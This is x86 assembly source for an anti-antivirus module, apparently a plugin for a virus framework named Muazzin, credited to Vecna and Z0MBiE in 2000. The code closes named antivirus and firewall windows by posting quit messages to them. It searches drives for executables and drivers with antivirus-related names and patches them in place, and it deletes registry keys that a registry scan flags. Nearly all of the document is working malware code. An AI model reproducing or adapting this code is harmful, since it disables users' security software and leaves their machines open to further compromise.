;(c) Vecna 2000
;AntiAv routines (c) Z0MBiE

BITS 32

;%define DEBUG 1

%include "\muazzin\muazzin.asi"

TYPE    EQU "d2av"
VERSION EQU 0102h

entry:
       mov esi, [esp+4]
       test dword [esi+m_why], MT_APP
       jnz anti_antivirus
       test dword [esi+m_why], MT_QUERY
       jnz .query
  .exit:
       mov dword [esi+m_result], MR_DONE
       ret 4
  .query:
       mov esi, MT_QUERY+MT_APP
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       ret 4

delta:
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       ret

anti_antivirus:
       pushad
       call delta
       mov eax, [esi+GPA]
       mov [ebp+getpaddr], eax
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       lea esi, [ebp+import_table]
  .next_dll:
       lodsd
       test eax, eax
       jz .all_import
       push esi
       stc
       sbb ebx, ebx
       lea esi, [eax+ebp]
       push esi
       call [ebp+getmhnd]
       test eax, eax
       jnz .dll_in_mem
       push esi
       call [ebp+LoadLibraryA]
       mov ebx, eax
  .dll_in_mem:
       xchg ebx, eax                            ;ebx==module handle
       mov ecx, [esp]
       mov [ecx-4], eax                         ;-1==no unload dll
  .skip_dllname:
       lodsb
       test al, al
       jnz .skip_dllname
  .next_import:
       lodsd
       test eax, eax
       jz .dll_done
       add eax, ebp
       push eax
       push ebx
       call [ebp+getpaddr]
       mov [esi-4], eax
       jmp .next_import
  .dll_done:
       pop esi
       jmp .next_dll
  .all_import:
%ifdef DEBUG
       push byte 0
       call .msg1
       db "AntiAV Muazzin",0
  .msg1:
       call .msg2
       db "Iniciando tarefas...",0
  .msg2:
       push byte 0
       call [ebp+MessageBoxA]
%endif
       call close_avs

       lea esi, [ebp+busca_recursiva]
       lea edi, [ebp+check_names]
       call .make_thread
       mov [ebp+.thread_id], eax

       lea edi, [ebp+badentry]
       push edi
       call regscan

       jmp .killpiq
  .killpiq:
       push byte -1
       push dword 12345678h
  .thread_id equ $-4
       call dword [ebp+WaitForSingleObject]
%ifdef DEBUG
       push byte 0
       call .msg11
       db "AntiAV Muazzin",0
  .msg11:
       call .msg21
       db "Todas as tarefas terminadas...",0
  .msg21:
       push byte 0
       call [ebp+MessageBoxA]
%endif
  .error:
       lea esi, [ebp+import_table]
  .next_unload:
       lodsd
       test eax, eax
       jz .all_unload
       inc eax
       jz .next_unload
       dec eax
       push eax
       call [ebp+FreeLibrary]
       jmp .next_unload
  .all_unload:
       popad
       jmp entry.exit

  .make_thread:
       sub eax, eax
       push eax
       push esp
       push eax
       push edi
       push esi
       push eax
       push eax
       call [ebp+CreateThread]
       add esp, byte 4
       ret

close_avs:
       pushad
       call delta
       lea esi, [ebp+avproggies]
  .nofound:
       cmp byte [esi], 0
       je .done
       push esi
  .next_str:
       lodsb
       test al, al
       jnz .next_str
       push byte 0
       call [ebp+FindWindowA]
       xchg eax, ecx
       jecxz .nofound
       push byte 0
       push byte 0
       push byte 12h
       push ecx
       call [ebp+PostMessageA]
  .done:
       popad
       ret

badentry:
       pushad
       call delta
%ifdef DEBUG
       push byte 0
       call .tmp1
       db "AntiAV Muazzin Registry",0
  .tmp1:
       push esi
       push byte 0
       call [ebp+MessageBoxA]
%else
       push edx
       push ebx
       call [ebp+RegDeleteKeyA]
%endif
       popad
       ret


check_names:
       pushad
       mov ebx, [esp+8*4+4]
       call delta
%ifdef DEBUG
       sub esp, 200h
%endif
       mov esi, ebx
  .search_end:
       lodsb
       test al, al
       jnz .search_end
       mov eax, dword [esi-1-4]
       and eax, 0dfdfdfffh
       cmp eax, ".EXE"
       je .is_it
       cmp eax, ".DLL"
       je .is_it
       cmp eax, ".VXD"
       jne near .is_not
  .is_it:
       mov edx, ebx

  .cycle:
       mov eax, [edx]
       inc edx
       or al, al
       jz .exit_normal
       or eax, 20202020h
       cmp eax, "anti"
       je .exit_bad
       cmp eax, "aids"
       je .exit_bad
       cmp eax, "viru"
       je .exit_bad
       cmp eax, "drwe"
       je .exit_bad
       cmp eax, "mcaf"
       je .exit_bad
       cmp eax, "adin"
       je .exit_bad
       sal eax, 8
       sar eax, 8
       cmp eax, "avp"
       je .exit_bad
       jmp .cycle
  .exit_normal:
       jmp .is_not
  .exit_bad:
%ifdef DEBUG
       mov esi, ebx
       mov edi, esp
  .nextch:
       lodsb
       stosb
       test al, al
       jnz .nextch
       mov dword [edi-1], ".---"
       mov byte [edi+3], al
       mov eax, esp
       push byte 1
       push eax
       push ebx
       call [ebp+CopyFileA]
       mov ebx, esp
%endif
       push byte 0
       push byte READWRITE
       push ebx
       call map
       jc .is_not
       mov esi, [ebp+handle3]
       mov ecx, [ebp+DTAbuffer+32]
       call patch_buffer
       call unmap
%ifdef DEBUG
       test eax, eax
       jnz .patched
       push ebx
       call [ebp+DeleteFileA]
       jmp .is_not
  .patched:
       push byte 0
       call .msg3
       db "AntiAV Muazzin",0
  .msg3:
       push ebx
       push byte 0
       call [ebp+MessageBoxA]
%endif
  .is_not:
%ifdef DEBUG
       sub esp, -200h
%endif
       popad
       ret 4

%include "\muazzin\samples\search2.asi"
%include "\muazzin\samples\regscan.asi"
%include "\muazzin\samples\antiav\aavpatch.asi"

avproggies:
db "AVG Control Center",0
db "Avast32 -- Rezidentní podpora",0
db "AVP Monitor",0
db "Amon Antivirus Monitor",0
db "Antivírusový monitor Amon",0
db "ZoneAlarm",0
db 0

getpaddr dd 0
getmhnd  dd 0

import_table dd kernel32
             dd advapi32
             dd user32
             dd 0

user32      db "USER32.DLL", 0
%ifdef DEBUG
.api001     dd .apiname001
%endif
.api002     dd .apiname002
.api003     dd .apiname003
            dd 0
%ifdef DEBUG
.apiname001 db "MessageBoxA", 0
%endif
.apiname002 db "FindWindowA", 0
.apiname003 db "PostMessageA", 0

kernel32    db "KERNEL32.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
%ifdef DEBUG
.api005     dd .apiname005
.api006     dd .apiname006
%endif
.api007     dd .apiname007
.api008     dd .apiname008
.api009     dd .apiname009
.api010     dd .apiname010
.api011     dd .apiname011
.api012     dd .apiname012
.api013     dd .apiname013
.api014     dd .apiname014
.api015     dd .apiname015
.api016     dd .apiname016
.api017     dd .apiname017
.api018     dd .apiname018
            dd 0
.apiname001 db "LoadLibraryA", 0
.apiname002 db "FreeLibrary", 0
.apiname003 db "CreateFileA", 0
.apiname004 db "CloseHandle", 0
%ifdef DEBUG
.apiname005 db "CopyFileA",0
.apiname006 db "DeleteFileA",0
%endif
.apiname007 db "GetDriveTypeA",0
.apiname008 db "SetCurrentDirectoryA",0
.apiname009 db "FindFirstFileA",0
.apiname010 db "FindNextFileA",0
.apiname011 db "FindClose",0
.apiname012 db "SetFileAttributesA",0
.apiname013 db "CreateFileMappingA",0
.apiname014 db "MapViewOfFile",0
.apiname015 db "UnmapViewOfFile",0
.apiname016 db "SetFileTime",0
.apiname017 db "CreateThread",0
.apiname018 db "WaitForSingleObject",0

advapi32    db "ADVAPI32.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api005     dd .apiname005
            dd 0
.apiname001 db "RegEnumValueA", 0
.apiname002 db "RegCloseKey", 0
.apiname003 db "RegOpenKeyA", 0
.apiname004 db "RegEnumKeyA", 0
.apiname005 db "RegDeleteKeyA", 0

%include "\muazzin\samples\maplib.asi"

%ifdef DEBUG
MessageBoxA equ user32.api001
%endif
FindWindowA equ user32.api002
PostMessageA equ user32.api003

LoadLibraryA         equ kernel32.api001
FreeLibrary          equ kernel32.api002
CreateFileA          equ kernel32.api003
CloseHandle          equ kernel32.api004
%ifdef DEBUG
CopyFileA            equ kernel32.api005
DeleteFileA          equ kernel32.api006
%endif
GetDriveTypeA        equ kernel32.api007
SetCurrentDirectoryA equ kernel32.api008
FindFirstFileA       equ kernel32.api009
FindNextFileA        equ kernel32.api010
FindClose            equ kernel32.api011
SetFileAttributesA   equ kernel32.api012
CreateFileMappingA   equ kernel32.api013
MapViewOfFile        equ kernel32.api014
UnmapViewOfFile      equ kernel32.api015
SetFileTime          equ kernel32.api016
CreateThread         equ kernel32.api017
WaitForSingleObject  equ kernel32.api018

RegEnumValueA equ advapi32.api001
RegCloseKey   equ advapi32.api002
RegOpenKeyA   equ advapi32.api003
RegEnumKeyA   equ advapi32.api004
RegDeleteKeyA equ advapi32.api005

